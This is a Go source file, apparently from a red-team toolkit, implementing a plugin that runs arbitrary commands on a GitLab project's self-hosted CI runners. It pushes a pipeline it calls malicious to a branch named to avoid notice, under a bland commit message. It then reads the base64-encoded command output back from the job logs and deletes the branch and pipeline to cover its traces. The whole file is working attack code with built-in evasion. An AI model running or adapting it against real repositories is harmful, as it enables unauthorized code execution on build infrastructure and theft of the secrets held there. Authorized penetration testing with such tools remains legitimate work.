// pkg/gitlab/attacks/runnerexec/runnerexec.go
package runnerexec

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/detections"
	"github.com/praetorian-inc/trajan/pkg/gitlab"
	"github.com/praetorian-inc/trajan/pkg/gitlab/attacks/common"
)

func init() {
	registry.RegisterAttackPlugin("gitlab", "runner-exec", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements command execution on self-hosted GitLab runners
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new runner-exec attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"runner-exec",
			"Execute commands on self-hosted GitLab runners",
			"gitlab",
			attacks.CategoryRunners,
		),
	}
}

// CanAttack always returns false (force-only plugin)
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	return false
}

// Execute performs command execution on self-hosted runner
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
		Repo:      opts.Target.Value,
	}

	// Parse runner tags from extra opts
	runnerTagsStr := opts.ExtraOpts["runner-tags"]
	if runnerTagsStr == "" {
		result.Success = false
		result.Message = "--runner-tags flag is required"
		return result, fmt.Errorf("missing required flag: --runner-tags")
	}

	// Split comma-separated tags
	runnerTags := strings.Split(runnerTagsStr, ",")
	for i := range runnerTags {
		runnerTags[i] = strings.TrimSpace(runnerTags[i])
	}

	// Validate command flag
	command := opts.ExtraOpts["command"]
	if command == "" {
		result.Success = false
		result.Message = "--command flag is required"
		return result, fmt.Errorf("missing required flag: --command")
	}

	// Get GitLab client
	glPlatform, ok := opts.Platform.(*gitlab.Platform)
	if !ok {
		result.Success = false
		result.Message = "platform is not GitLab"
		return result, fmt.Errorf("invalid platform type")
	}

	client := glPlatform.Client()

	// Parse project path
	projectPath := opts.Target.Value
	fmt.Printf("Targeting project: %s\n", projectPath)
	fmt.Printf("Runner tags: %v\n", runnerTags)
	fmt.Printf("Command: %s\n\n", command)

	// Get project
	project, err := client.GetProject(ctx, projectPath)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get project: %v", err)
		return result, err
	}

	projectID := project.ID

	// Get current user
	user, err := client.GetUser(ctx)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get current user: %v", err)
		return result, err
	}

	// Check user permissions (Developer+ required)
	member, err := client.GetProjectMember(ctx, projectID, strconv.Itoa(user.ID))
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to check permissions: %v", err)
		return result, err
	}

	if member.AccessLevel < 30 {
		result.Success = false
		result.Message = fmt.Sprintf("Insufficient permissions: need Developer (30+), have %s (%d)",
			member.RoleName, member.AccessLevel)
		return result, fmt.Errorf("insufficient permissions")
	}

	fmt.Printf("User has %s access (level: %d)\n", member.RoleName, member.AccessLevel)

	// Check pipelines enabled
	if !project.JobsEnabled {
		result.Success = false
		result.Message = "CI/CD pipelines are disabled for this project"
		return result, fmt.Errorf("pipelines disabled")
	}

	fmt.Printf("Pipelines enabled: true\n\n")

	// Cleanup tracking
	var branchName string
	var pipelineID int
	var cleanupJobID int

	// Register cleanup - always runs even if attack fails
	cleanup := &common.DeferredCleanup{
		Client:     client,
		ProjectID:  projectID,
		BranchName: &branchName,
		PipelineID: &pipelineID,
		JobID:      &cleanupJobID,
		Disabled:   opts.ExtraOpts["cleanup"] == "false",
	}
	defer cleanup.Run()

	// Get default branch
	defaultBranch := project.DefaultBranch
	if defaultBranch == "" {
		defaultBranch = "main"
	}

	// Get default branch SHA
	branch, err := client.GetBranch(ctx, projectID, defaultBranch)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get default branch: %v", err)
		return result, err
	}

	branchSHA := branch.Commit.ID

	// Generate OpSec-friendly branch name
	branchName = common.GenerateBranchName(opts.SessionID)
	fmt.Printf("Creating branch %s...\n", branchName)

	// Create attack branch
	err = client.CreateBranch(ctx, projectID, branchName, branchSHA)
	if err != nil {
		if strings.Contains(err.Error(), "already exists") {
			// Handle collision with timestamp suffix
			branchName = fmt.Sprintf("%s-%d", branchName, time.Now().Unix())
			err = client.CreateBranch(ctx, projectID, branchName, branchSHA)
		}

		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to create branch: %v", err)
			return result, err
		}
	}

	fmt.Printf("Branch created successfully\n\n")

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Description: "Attack branch created",
	})

	// Generate malicious pipeline YAML
	pipelineYAML, err := GeneratePipelineYAML(runnerTags, command)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to generate pipeline YAML: %v", err)
		return result, err
	}

	// Check if .gitlab-ci.yml exists on the branch
	_, err = client.GetWorkflowFile(ctx, projectID, ".gitlab-ci.yml", branchName)
	action := "create"
	if err == nil {
		// File exists, use update
		action = "update"
	}

	// Commit .gitlab-ci.yml to attack branch
	fmt.Printf("Pushing malicious pipeline...\n")

	commitActions := []gitlab.CommitAction{
		{
			Action:   action,
			FilePath: ".gitlab-ci.yml",
			Content:  pipelineYAML,
		},
	}

	commit, err := client.CreateCommit(ctx, projectID, branchName, commitActions, "Update CI configuration")
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to commit pipeline: %v", err)
		return result, err
	}

	// Track commit timestamp to filter correct pipeline
	commitTimestamp := commit.CreatedAt
	_ = commitTimestamp // Will be used in pipeline polling

	fmt.Printf("Committed .gitlab-ci.yml to %s\n\n", branchName)

	// Wait for pipeline to complete
	timeout := 5 * time.Minute
	if opts.Timeout > 0 {
		timeout = opts.Timeout
	}

	fmt.Printf("Waiting for pipeline to complete (timeout: %v)...\n", timeout)

	pipeline, err := common.WaitForPipeline(ctx, client, projectID, branchName, commitTimestamp, timeout)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("pipeline wait failed: %v\nThis may mean no runner with tags %v is available or online", err, runnerTags)
		return result, err
	}

	// Track pipeline ID for cleanup
	pipelineID = pipeline.ID

	fmt.Printf("\n")

	// Check pipeline status
	if pipeline.Status != "success" {
		// Get job logs to show failure reason
		jobs, _ := client.ListPipelineJobs(ctx, projectID, pipeline.ID)
		failureDetails := ""
		if len(jobs) > 0 {
			logs, _ := client.GetJobTrace(ctx, projectID, jobs[0].ID)
			if len(logs) > 500 {
				logs = logs[len(logs)-500:] // Last 500 chars
			}
			failureDetails = fmt.Sprintf("\n\nJob logs (last 500 chars):\n%s", logs)
		}

		result.Success = false
		result.Message = fmt.Sprintf("Pipeline failed with status: %s\nPipeline: %s%s",
			pipeline.Status, pipeline.WebURL, failureDetails)
		return result, fmt.Errorf("pipeline failed")
	}

	// Get job ID from pipeline
	jobs, err := client.ListPipelineJobs(ctx, projectID, pipeline.ID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get pipeline jobs: %v\nPipeline: %s", err, pipeline.WebURL)
		return result, fmt.Errorf("failed to list jobs: %w", err)
	}

	if len(jobs) == 0 {
		result.Success = false
		result.Message = fmt.Sprintf("no jobs found for pipeline\nPipeline: %s", pipeline.WebURL)
		return result, fmt.Errorf("no jobs found")
	}

	jobID := jobs[0].ID
	cleanupJobID = jobID // Track for cleanup

	// Fetch job logs from GitLab API
	fmt.Printf("Fetching job logs from pipeline...\n")

	logs, err := client.GetJobTrace(ctx, projectID, jobID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to fetch logs: %v", err)
		return result, err
	}

	fmt.Printf("Fetched %.1f KB of logs\n\n", float64(len(logs))/1024)

	// Display job logs to console
	fmt.Printf("=== Job Logs ===\n%s\n================\n\n", logs)

	// Extract and decode command output
	fmt.Printf("Extracting command output...\n")

	output, err := ExtractBase64Output(logs, command)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("Failed to extract command output from logs.\n"+
			"This usually means:\n"+
			"  - Command failed or produced no output\n"+
			"  - base64 not available in runner image\n"+
			"  - Job logs were truncated\n\n"+
			"Error: %v\nPipeline: %s", err, pipeline.WebURL)
		return result, err
	}

	fmt.Printf("Extraction successful\n\n")

	// Success - set result data
	result.Success = true
	result.Message = fmt.Sprintf("Command executed successfully on runners with tags %v", runnerTags)
	result.Data = map[string]interface{}{
		"output":      output,
		"runner_tags": runnerTags,
		"command":     command,
		"branch":      branchName,
		"pipeline_id": pipeline.ID,
		"job_id":      jobID,
	}

	// Display output
	fmt.Printf("=== Command Output ===\n")
	if output == "" {
		fmt.Printf("(no output)\n")
	} else {
		fmt.Printf("%s\n", output)
	}
	fmt.Printf("======================\n\n")

	// Save to file if requested
	outputFile := opts.ExtraOpts["output-file"]
	if outputFile != "" {
		if err := os.WriteFile(outputFile, []byte(output), 0o600); err != nil {
			fmt.Printf("Warning: failed to save output to file: %v\n", err)
		} else {
			fmt.Printf("Saved output to: %s\n\n", outputFile)
		}
	}

	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactBranch,
			Identifier:  branchName,
			Action:      "delete",
			Description: "Delete attack branch",
		},
		{
			Type:        attacks.ArtifactWorkflow,
			Identifier:  fmt.Sprintf("pipeline:%d", pipelineID),
			Action:      "delete",
			Description: "Delete pipeline",
		},
	}

	return result, nil
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	glPlatform, ok := session.Platform.(*gitlab.Platform)
	if !ok {
		return fmt.Errorf("invalid platform type")
	}
	return common.CleanupSessionArtifacts(ctx, glPlatform.Client(), session, p.Name())
}
